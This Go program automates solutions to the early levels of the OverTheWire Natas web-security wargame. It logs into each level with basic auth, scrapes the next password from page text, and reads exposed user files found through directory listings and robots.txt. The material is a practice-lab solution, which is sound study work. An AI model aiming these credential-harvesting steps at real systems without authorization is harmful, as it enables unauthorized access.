package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"

	"github.com/MJKWoolnough/errors"
	"github.com/MJKWoolnough/memio"
)

var buf memio.Buffer

type Grabber interface {
	Grab(http.Request) (string, error)
}

type Prefixed struct {
	Prefix string
	Length int
}

func (p Prefixed) Grab(r http.Request) (string, error) {
	buf = buf[:0]
	resp, err := http.DefaultClient.Do(&r)
	if err != nil {
		return "", err
	}
	io.Copy(&buf, resp.Body)
	resp.Body.Close()
	index := bytes.Index(buf, []byte(p.Prefix))

	if index < 0 || len(buf) < index+len(p.Prefix)+p.Length {
		return "", errors.Error("failed to get password")
	}
	return string(buf[index+len(p.Prefix) : index+len(p.Prefix)+p.Length]), nil
}

type Path struct {
	Grabber
	Path string
}

func (p Path) Grab(r http.Request) (string, error) {
	oldPath := r.URL.Path
	r.URL.Path = p.Path
	s, err := p.Grabber.Grab(r)
	r.URL.Path = oldPath
	return s, err
}

var levels = [...]Grabber{
	Prefixed{"The password for natas1 is ", 32},
	Prefixed{"The password for natas2 is ", 32},
	Path{Prefixed{"natas3:", 32}, "/files/users.txt"},  // image @ /files/pixel.png, go to folder, find users.txt
	Path{Prefixed{"natas4:", 32}, "/s3cr3t/users.txt"}, // robots.txt references /s3cr3t/, find users.txt
}

func main() {
	var (
		level    uint
		password string
		err      error
	)
	flag.UintVar(&level, "l", 0, "level number. > 0 requires password")
	flag.StringVar(&password, "p", "natas0", "password for initial level")
	flag.Parse()

	r := http.Request{
		Header: make(http.Header),
	}

	for n, grabber := range levels[level:] {
		n += int(level)

		log.Printf("natas %2d: Solving...", n)

		r.URL, _ = url.Parse(fmt.Sprintf("http://natas%d.natas.labs.overthewire.org/", n))
		r.SetBasicAuth(fmt.Sprintf("natas%d", n), password)

		password, err = grabber.Grab(r)
		if err != nil {
			log.Printf("natas %2d: error: %s", n, err)
			return
		}
		log.Printf("natas %2d: Password: %s", n, password)
	}
}
